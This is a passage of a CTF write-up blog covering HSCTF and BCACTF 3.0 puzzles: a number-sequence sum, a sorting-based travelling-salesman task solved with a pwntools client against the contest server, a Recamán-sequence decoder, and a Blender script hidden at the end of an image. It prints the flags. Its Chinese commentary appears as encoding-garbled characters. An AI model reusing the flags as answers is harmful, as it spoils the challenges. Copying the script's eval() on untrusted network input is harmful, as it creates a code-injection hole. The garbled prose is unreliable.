class="hljs-string">]</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®å¯ä»¥çœ‹å‡ºæ¥è§„å¾‹äº†ã€‚å¯ä»¥çœ‹åˆ°10ï¼Œ20ï¼Œ30ï¼Œ40ç®—æ˜¯ä¸€é¡¹çš„åˆ†ç•Œçº¿ã€‚é‚£ä¹ˆä»–ä»¬å‰é¢éƒ½æ˜¯20è¿™ä¸ªæ•°å­—ã€‚ç¬¬ä¸€é¡¹20çš„ä¸ªæ•°æ˜¯2ä¸ªï¼Œè€Œç¬¬äºŒé¡¹æ˜¯6ä¸ªï¼Œåé¢æ˜¯14ï¼Œ30ã€‚è¿™é‡Œå¯ä»¥å¾—åˆ°20çš„ä¸ªæ•°çš„é€’æ¨å¼ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub><mo>=</mo><mn>2</mn><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a_n = 2(a_{n-1}+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p><p>ç¬¬ä¸€é¡¹ä¸º2ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾—åˆ°åé¢æ¯æ¬¡å¢åŠ çš„20çš„ä¸ªæ•°ã€‚</p><p>è¿˜æœ‰å°±æ˜¯10ï¼Œ20ï¼Œ30è¿™ä¸ªæ•°åˆ—ã€‚ç›´æ¥åŠ ä¸Šå°±å¥½äº†ã€‚</p><p>æ‰€ä»¥æ¯æ¬¡useè¿”å›çš„å°±æ˜¯ä»¥ä¸‹æ•°åˆ—ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Y</mi><mi>n</mi></msub><mo>=</mo><mn>10</mn><msub><mi>a</mi><mi>n</mi></msub><mo>+</mo><mn>10</mn><msub><mi>b</mi><mi>n</mi></msub><mspace linebreak="newline"></mspace><msub><mi>a</mi><mi>n</mi></msub><mo>=</mo><mn>2</mn><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>b</mi><mi>n</mi></msub><mo>=</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">Y_n = 10a_n + 10b_n \\a_n = 2(a_{n-1}+1) \\b_n = n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span></span></p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">an = [<span class="hljs-number">4</span>]<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">250</span>):<br>    an.append(an[-<span class="hljs-number">1</span>]*<span class="hljs-number">2</span> + <span class="hljs-number">4</span>)<br>bn = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">251</span>)]<br>Yn = [an[i] + bn[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(bn))]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">sum</span>(Yn[:<span class="hljs-number">214</span>])*<span class="hljs-number">10</span>)<br><br><span class="hljs-comment"># 2106245833371143733958360553673408646377901908010982225086219772130</span><br><span class="hljs-comment"># flag&#123;2106245833371143733958360553673408646377901908010982225086219772130&#125;</span><br></code></pre></td></tr></table></figure><h1 id="algorithm"><a class="markdownIt-Anchor" href="#algorithm"></a> Algorithm</h1><p>è¿™ä¸ªåˆ†ç±»ï¼Œemmmæœ‰ç‚¹åƒacmï¼Ÿ</p><h2 id="travelling-salesman"><a class="markdownIt-Anchor" href="#travelling-salesman"></a> <strong>travelling-salesman</strong></h2><p>Description:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Euclidean</span> traveling salesman over single dimension? nc travelling-salesman.hsctf.com <span class="hljs-number">1337</span><br></code></pre></td></tr></table></figure><p>æœ‰ä¸ªç®—æ³•é™„ä»¶ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Task</span><br><span class="hljs-attribute">You</span> are handing out newspapers to classrooms in HSN. There is a list of classrooms given to you that you<br><span class="hljs-attribute">have</span> to visit. These classrooms are conveniently located in a single hallway, which has <span class="hljs-number">100</span> classrooms<br><span class="hljs-attribute">numbered</span> <span class="hljs-number">1</span> .. <span class="hljs-number">100</span> in order. Since you are lazy, you want to minimize your walking distance. Given that you<br><span class="hljs-attribute">must</span> start and end at classroom <span class="hljs-number">1</span>, output the order of classes to visit in order to minimize your walking<br><span class="hljs-attribute">distance</span>. If there are multiple solutions, output any.<br><span class="hljs-attribute">Interaction</span> Details:<br><span class="hljs-attribute">There</span> will be <span class="hljs-number">3</span> test cases.<br><span class="hljs-attribute">For</span> each test case, you will be given an array of integers representing the classrooms to visit. You will then be<br><span class="hljs-attribute">prompted</span> to enter a list of space separated integers representing the order in which the classrooms will be<br><span class="hljs-attribute">visited</span>.<br><span class="hljs-attribute">Sample</span> Interaction:<span class="hljs-meta"></span><br><span class="hljs-meta">[59, 68, 24, 83]</span><br><span class="hljs-attribute">order</span>: <span class="hljs-number">59</span> <span class="hljs-number">83</span> <span class="hljs-number">68</span> <span class="hljs-number">24</span><span class="hljs-meta"></span><br><span class="hljs-meta">[27, 29, 43, 50, 78, 21, 70, 89, 93, 85]</span><br><span class="hljs-attribute">order</span>: <span class="hljs-number">27</span> <span class="hljs-number">29</span> <span class="hljs-number">43</span> <span class="hljs-number">50</span> <span class="hljs-number">78</span> <span class="hljs-number">21</span> <span class="hljs-number">70</span> <span class="hljs-number">89</span> <span class="hljs-number">93</span> <span class="hljs-number">85</span><br><span class="hljs-attribute">Distance</span> too large<br></code></pre></td></tr></table></figure><p>å°±æ˜¯100ä¸ªæ•™å®¤ï¼Œæˆ‘ä»ç¬¬ä¸€ä¸ªå¼€å§‹ï¼Œèµ°åˆ°ç»™å®šçš„orderçš„æ•™å®¤ã€‚è¦æŠŠå…¨éƒ¨éœ€è¦çš„æ•™å®¤èµ°å®Œï¼Œæœ€åå›åˆ°1ã€‚è¿™ä¸ªå…¶å®ç›´æ¥æ’åºå°±è¡Œäº†ï¼Œæœ€é åçš„æ•™å®¤æ˜¯ä¸€å®šè¦å»çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦èµ°åˆ°æœ€è¿œçš„æ•™å®¤ä¹‹ä¸­æŠŠéœ€è¦çš„éƒ½èµ°åˆ°å°±è¡Œï¼Œä¹Ÿå°±æ˜¯æ’åºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br><br>r = pwn.remote(<span class="hljs-string">&quot;travelling-salesman.hsctf.com&quot;</span>, <span class="hljs-number">1337</span>)<br>r.recvline() <span class="hljs-comment"># == proof-of-work: disabled ==</span><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    order = <span class="hljs-built_in">eval</span>(r.recvuntil(<span class="hljs-string">b&quot;order:&quot;</span>).replace(<span class="hljs-string">b&quot;\norder:&quot;</span>, <span class="hljs-string">b&quot;&quot;</span>))<br>    <span class="hljs-built_in">print</span>(order)<br>    r.send(<span class="hljs-string">&quot; &quot;</span>.join(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,<span class="hljs-built_in">sorted</span>(order)))).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;\n&quot;</span>)<br><br><span class="hljs-built_in">print</span>(r.recvline())<br></code></pre></td></tr></table></figure><p>å°±å¯ä»¥å¾—åˆ°flagã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">[x] Opening connection to travelling-salesman.hsctf.com on port 1337<br>[x] Opening connection to travelling-salesman.hsctf.com on port 1337: Trying 34.147.9.219<br>[+] Opening connection to travelling-salesman.hsctf.com on port 1337: Done<br>[66, 57, 61, 98]<br>[81, 97, 50, 42, 52, 15, 36, 51, 31, 85]<br>[78, 71, 27, 17, 54, 55, 83, 77, 64, 45, 58, 40, 20, 35, 29, 86, 34, 22, 48, 43, 19, 73, 33, 81, 70, 94, 16, 65, 36, 79]<br>[61, 46, 59, 58, 87, 75, 64, 52, 66, 81, 76, 74, 11, 22, 72, 14, 34, 85, 37, 45, 24, 43, 19, 36, 20, 27, 79, 69, 53, 56, 13, 62, 35, 60, 16, 39, 42, 93, 48, 26, 29, 33, 54, 99, 38, 65, 83, 12, 50, 84]<br>[84, 42, 72, 59, 46, 40, 73, 96, 70, 62, 33, 22, 92, 43, 29, 49, 71, 27, 41, 37, 97, 78, 50, 98, 74, 87, 85, 51, 65, 55, 14, 39, 12, 34, 89, 38, 75, 28, 86, 19, 81, 83, 63, 36, 52, 25, 69, 58, 48, 32]<br>b&#x27; flag&#123;the_fitness_gram_pacer_test_is_a_multistage_aerobic_capacity_test_8182295882010254837&#125;\n&#x27;<br>[*] Closed connection to travelling-salesman.hsctf.com port 1337<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">flag&#123;the_fitness_gram_pacer_test_is_a_multistage_aerobic_capacity_test_8182295882010254837&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>Crypto</tag>
      
      <tag>MISC</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BCACTF 3.0</title>
    <link href="/2022/06/09/BCACTF-3-0/"/>
    <url>/2022/06/09/BCACTF-3-0/</url>
    
    <content type="html"><![CDATA[<p>BCACTF 3.0</p><span id="more"></span><p>éº»äº†ï¼Œä¹‹å‰çš„æ²¡ä¿å­˜å…¨æ²¡äº†â€¦</p><p>è¿™ä¸ªæ¯”èµ›ç»™çš„æç¤ºæ˜¯çœŸçš„å¤šã€‚éš¾åº¦ä¸æ‰“ï¼Œå¾ˆé€‚åˆæˆ‘ ğŸ˜ƒã€‚</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="sequence"><a class="markdownIt-Anchor" href="#sequence"></a> Sequence</h2><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><pre><code class="hljs python">sequence = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>]<br>numbers = [<span class="hljs-number">774</span>, <span class="hljs-number">5842</span>, <span class="hljs-number">4294</span>, <span class="hljs-number">9433</span>, <span class="hljs-number">5232</span>, <span class="hljs-number">1871</span>, <span class="hljs-number">3292</span>, <span class="hljs-number">4213</span>, <span class="hljs-number">2752</span>, <span class="hljs-number">5521</span>, <span class="hljs-number">4581</span>, <span class="hljs-number">3829</span>, <span class="hljs-number">2812</span>, <span class="hljs-number">2244</span>, <span class="hljs-number">3312</span>, <span class="hljs-number">7059</span>, <span class="hljs-number">2959</span>, <span class="hljs-number">8297</span>, <span class="hljs-number">7497</span>, <span class="hljs-number">1272</span>, <span class="hljs-number">2288</span>, <span class="hljs-number">160</span>, <span class="hljs-number">594</span>, <span class="hljs-number">158</span>, <span class="hljs-number">4833</span>, <span class="hljs-number">7140</span>, <span class="hljs-number">5352</span>, <span class="hljs-number">142</span>, <span class="hljs-number">3018</span>, <span class="hljs-number">9468</span>, <span class="hljs-number">5625</span>, <span class="hljs-number">4848</span>, <span class="hljs-number">2051</span>, <span class="hljs-number">3008</span>, <span class="hljs-number">4298</span>, <span class="hljs-number">6250</span>, <span class="hljs-number">144</span>]<br>validPass = <span class="hljs-string">&quot;ABCFEDFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123457890&#123;&#125;_&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gensequence</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        <span class="hljs-comment"># TODO write sequence generator for one of the most famous sequences and add it to sequence</span><br>        <span class="hljs-keyword">pass</span><br>    <br>gensequence()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> numbers:<br>    <span class="hljs-built_in">print</span>(validPass[sequence[i]%<span class="hljs-built_in">len</span>(validPass)], end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>æç¤ºæ˜¯è‘—åçš„æ•°åˆ—ä¹‹ä¸€ã€‚googleçœ‹äº†ä¸€ä¸‹åº”è¯¥æ˜¯é›·å¡æ›¼æ•°åˆ—ï¼Œå‰é¢å‡ é¡¹ä¹Ÿèƒ½å¯¹çš„ä¸Šã€‚å®Œæˆç”Ÿæˆæ•°åˆ—å‡½æ•°å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gensequence</span>():<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        <span class="hljs-keyword">if</span> sequence[-<span class="hljs-number">1</span>]-<span class="hljs-built_in">len</span>(sequence) &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> sequence[-<span class="hljs-number">1</span>]-<span class="hljs-built_in">len</span>(sequence) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> sequence:<br>            sequence.append(sequence[-<span class="hljs-number">1</span>]-<span class="hljs-built_in">len</span>(sequence))<br>        <span class="hljs-keyword">else</span> :<br>            sequence.append(sequence[-<span class="hljs-number">1</span>]+<span class="hljs-built_in">len</span>(sequence))<br>            <br><span class="hljs-comment"># bcactf&#123;Cr4cKInG_Th3_R3C4MaN_S3qu3NcE&#125;</span><br></code></pre></td></tr></table></figure><h2 id="blender-creation"><a class="markdownIt-Anchor" href="#blender-creation"></a> Blender Creation</h2><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€å¼ å›¾ç‰‡ï¼ŒäºŒè¿›åˆ¶æŸ¥çœ‹å¯ä»¥çœ‹åˆ°æœ«å°¾æœ‰ä¸€æ®µpythonä»£ç ã€‚dumpå‡ºæ¥çœ‹çœ‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> bpy<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br>bpy.ops.<span class="hljs-built_in">object</span>.select_all(action=<span class="hljs-string">&quot;SELECT&quot;</span>)<br>bpy.context.scene.cursor.location = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>bpy.ops.<span class="hljs-built_in">object</span>.delete(use_global=<span class="hljs-literal">False</span>, confirm=<span class="hljs-literal">False</span>)<br>bpy.ops.<span class="hljs-built_in">object</span>.camera_add(<br>    enter_editmode=<span class="hljs-literal">False</span>,<br>    align=<span class="hljs-string">&quot;VIEW&quot;</span>,<br>    location=(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>    rotation=(<span class="hljs-number">1.1169</span>, <span class="hljs-number">0.01420</span>, <span class="hljs-number">0.8269</span>),<br>    scale=(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>),<br>)<br>bpy.ops.transform.translate(<br>    value=(<span class="hljs-number">4.58569</span>, -<span class="hljs-number">4.20269</span>, <span class="hljs-number">3.1699</span>),<br>    orient_type=<span class="hljs-string">&quot;GLOBAL&quot;</span>,<br>    orient_matrix=((<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)),<br>)<br>bpy.ops.mesh.primitive_monkey_add(<br>    size=<span class="hljs-number">2</span>, enter_editmode=<span class="hljs-literal">False</span>, align=<span class="hljs-string">&quot;WORLD&quot;</span>, location=(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), scale=(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>)<br>u =  <span class="hljs-string">&quot;__&quot;</span>[<span class="hljs-number">1</span>:] + <span class="hljs-string">&#x27;x_N3r0f__&#x27;</span>[<span class="hljs-number">2</span>:-<span class="hljs-number">2</span>][::-<span class="hljs-number">1</span>]<br>yrsth = <span class="hljs-string">&quot;b&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">0</span>].vertices) - <span class="hljs-number">3</span>) + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">2</span>].vertices) - <span class="hljs-number">1</span>)+ <span class="hljs-string">&quot;NdR__&quot;</span> +  <span class="hljs-string">&quot;Xp_R3&quot;</span>[<span class="hljs-number">1</span>::-<span class="hljs-number">1</span>] + <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">3</span>].vertices) + <span class="hljs-built_in">int</span>(<span class="hljs-number">42.5</span>*<span class="hljs-number">2</span>)) + <span class="hljs-string">&quot;YtH0&quot;</span>[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>] + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">5</span>].vertices) ** <span class="hljs-number">0</span> - <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;N_4ND&quot;</span> + u<br>bpy.ops.<span class="hljs-built_in">object</span>.light_add(<br>    <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;POINT&quot;</span>, radius=<span class="hljs-number">1</span>, align=<span class="hljs-string">&quot;WORLD&quot;</span>, location=(<span class="hljs-number">0</span>, -<span class="hljs-number">2.5</span>, <span class="hljs-number">0</span>), scale=(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>)<br>x = (<br>    <span class="hljs-built_in">int</span>(<br>        <span class="hljs-number">0x0000000000000080</span><br>        + <span class="hljs-number">0x0000000000000240</span><br>        + <span class="hljs-number">0x0000000000000840</span><br>        - <span class="hljs-number">0x0000000000000AC0</span><br>    )<br>    - <span class="hljs-number">2</span><br>)<br>bpy.context.<span class="hljs-built_in">object</span>.data.energy = <span class="hljs-number">50</span><br>bpy.context.<span class="hljs-built_in">object</span>.data.color = (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0.69420</span>)<br><br>a = (<br>    <span class="hljs-built_in">str</span>(<br>        b64decode(<br>            (<br>                <span class="hljs-built_in">chr</span>(x - <span class="hljs-number">0x000000000000001</span>)<br>                + <span class="hljs-built_in">chr</span>(x - <span class="hljs-number">0x000000000000001</span> * <span class="hljs-number">10</span> // <span class="hljs-number">2</span> + <span class="hljs-number">6</span> - <span class="hljs-number">6</span> % <span class="hljs-number">4</span>)<br>                + (<span class="hljs-string">&quot;wemR3YhNmY&quot;</span>)<br>            )[::-<span class="hljs-number">1</span>]<br>        )<br>    )[:-<span class="hljs-number">1</span>]<br>    + yrsth<br>    + <span class="hljs-string">&quot;&#125;&quot;</span><br>)[<span class="hljs-number">2</span>:]<br>bpy.data.curves.new(<span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;FONT&quot;</span>, name=<span class="hljs-string">&quot;Font Curve&quot;</span>).body = a<br>font_obj = bpy.data.objects.new(<br>    name=<span class="hljs-string">&quot;Font Object&quot;</span>, object_data=bpy.data.curves[<span class="hljs-string">&quot;Font Curve&quot;</span>]<br>)<br>bpy.context.scene.collection.objects.link(font_obj)<br>font_obj.location = (<span 